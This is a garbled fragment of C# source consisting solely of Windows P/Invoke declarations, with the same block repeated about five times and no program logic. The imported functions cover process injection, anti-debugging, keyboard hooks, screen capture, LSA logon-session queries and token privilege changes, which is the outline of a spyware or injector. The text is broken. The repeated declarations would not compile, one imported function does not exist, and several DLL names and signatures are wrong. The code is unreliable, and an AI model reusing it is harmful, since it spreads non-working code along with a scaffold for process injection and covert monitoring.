        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
